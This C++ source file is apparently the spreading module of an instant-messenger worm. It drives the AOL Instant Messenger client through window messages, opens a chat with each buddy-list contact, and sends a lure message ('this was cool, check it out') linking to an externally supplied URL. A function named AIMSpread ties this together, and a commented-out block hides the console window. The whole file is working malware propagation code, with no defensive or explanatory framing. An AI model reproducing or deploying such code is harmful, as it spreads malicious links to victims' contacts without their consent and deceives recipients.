#include <string>
#include <windows.h>
#include <math.h>
#include "structure.h"
#include <list>
#define WIN32_LEAN_AND_MEAN	
#include <stdlib.h>  
#include <stdio.h>    
#include <iostream>  
#include <tchar.h>
extern link_t link;
using namespace std;
using std::string;
cAim_t aim;
HWND FindBuddyList()
{
	HWND oscarNotify = FindWindow("_Oscar_StatusNotify", NULL);
	if ( IsWindow(oscarNotify) )
	{
		SendMessage(oscarNotify, WM_COMMAND, 20003, 0);

		HWND buddyList = 0;
		HWND aimAd = 0;
		do
		{
			buddyList = FindWindowEx(0, buddyList, "#32770", NULL);
			if ( IsWindow(buddyList) )
			{
				aimAd = FindWindowEx(buddyList, 0, "_AimAd", NULL);
				if ( IsWindow(aimAd) )
				{
					return buddyList;
				}
			}
		}
		while ( IsWindow(buddyList) );
	}
	return 0;
}
void SendIM(HWND imWindow, LPCTSTR message)
{
	HWND textBox = 0;
	HWND wndAte = 0;
	do
	{
		wndAte = FindWindowEx(imWindow, wndAte, "WndAte32Class", NULL);
		if ( IsWindow(wndAte) )
		{
            textBox = FindWindowEx(wndAte, 0, "CBClass", NULL);
			if ( IsWindow(textBox) )
			{
				textBox = FindWindowEx(wndAte, 0, "Ate32Class", NULL);
				SendMessage(textBox, WM_SETTEXT, 0, (LPARAM)message);
				wndAte = 0;
			}
		}
	}
	while ( IsWindow(wndAte) );
	do
	{
		wndAte = FindWindowEx(imWindow, wndAte, "_Oscar_IconBtn", NULL);
		if ( IsWindow(wndAte) )
		{
			if ( ((int)GetMenu(wndAte)) == 409 )
			{
				SendMessage(wndAte, WM_LBUTTONDOWN, 0, 0);
				SendMessage(wndAte, WM_LBUTTONUP, 0, 0);
				wndAte = 0;
			}
		}
	}
	while ( IsWindow(wndAte) );
}
void IMAllWindows(LPCTSTR message)
{
	HWND imWindow = 0;
	do
	{
		imWindow = FindWindowEx(0, 0, "AIM_IMessage", NULL);
		if ( IsWindow(imWindow) )
		{
			SendIM(imWindow, message);
			SendMessage(imWindow, WM_CLOSE, 0, 0);
		}
		Sleep(4000);
	}
	while ( IsWindow(imWindow) );
}

void IMAll(HWND buddyList, LPCTSTR message)
{
	HWND oscarTree = FindWindowEx(buddyList, 0, "#32770", NULL);
	oscarTree = FindWindowEx(oscarTree, 0, "_Oscar_Tree", NULL);
	if ( IsWindow(oscarTree) )
	{
		int itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
		int itemIndex = -1;
		while ( itemCount > itemIndex )
		{
			SendMessage(oscarTree, LB_SETCURSEL, ++itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 37, 0);

			SendMessage(oscarTree, WM_KEYUP, 37, 0);
		}

		itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
		itemIndex = itemCount;
		--itemIndex;
		while (( --itemIndex >= 0 ) && (aim.x))
		{
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 39, 0);
			SendMessage(oscarTree, WM_KEYUP, 39, 0);
			int temp = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
			temp -= ( itemCount - itemIndex );
			for ( int i = itemIndex + 1; i <= temp; ++i )
			{
				SendMessage(oscarTree, LB_SETCURSEL, i, 0);
				SendMessage(buddyList, WM_COMMAND, 139, 0);
				IMAllWindows(message);
			}
			
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 37, 0);
			SendMessage(oscarTree, WM_KEYUP, 37, 0);
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
		}
	}
}

DWORD WINAPI AIMSpread (void *pVoid) {
	/*HWND theWindow = FindWindow("ConsoleWindowClass", 0);
    if (theWindow) ShowWindow(theWindow, SW_HIDE);
*/
	string msg = "<a href=\"" + link.link + "\">this</a> was cool, check it out";

	HWND buddyList = FindBuddyList();
	if ( IsWindow(buddyList) )
		IMAll(buddyList, msg.c_str() );
	
	return 0;
}